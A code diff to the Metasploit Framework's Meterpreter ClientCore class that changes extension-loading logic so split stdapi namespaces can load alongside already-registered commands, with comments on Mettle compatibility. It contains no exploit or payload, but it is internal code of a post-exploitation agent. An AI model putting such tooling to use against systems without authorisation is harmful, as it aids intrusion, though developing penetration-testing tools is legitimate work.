@@ -346,9 +346,19 @@ class ClientCore < Extension
     # already loaded
     commands = get_loaded_extension_commands(mod.downcase)
 
-    # if there are existing commands for the given extension, then we can use
-    # what's already there
-    unless commands.length > 0
+    # This check is important to keep compatibility with Mettle:
+    # Mettle is the only meterpreter that has stdapi functions embedded in the metsrv.
+    # Double-loading of extensions is prevented by the lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb line: 1195
+    # However we need to add more flexibility here to allow users loading the split of stdapi in Windows Meterpreter. 
+    # reference: https://github.com/rapid7/metasploit-framework/pull/19975
+    # So here we are actively preventing loading of stdapi if some commands for that extension are already loaded.
+    # So we will not load stdapi if:
+    # - we are running mettle (which has by default those command registered)
+    # - we are running windows meterpreter with one of the stdapi namespace loaded (stdapi_net, stdapi_fs.... etc). 
+    #   partial loading of the other namespace is still possible, we can load stdapi_net and stdapi_fs later.
+    
+    skip_loading = commands.length > 0 && !mod.downcase.start_with?('stdapi_')
+    unless skip_loading
       image = nil
       path = nil
       # If client.sys isn't setup, it's a Windows meterpreter
@@ -393,7 +403,6 @@ class ClientCore < Extension
           'Extension'        => true,
           'SaveToDisk'       => opts['LoadFromDisk'])
     end
-
     # wire the commands into the client
     client.add_extension(mod, commands)
 
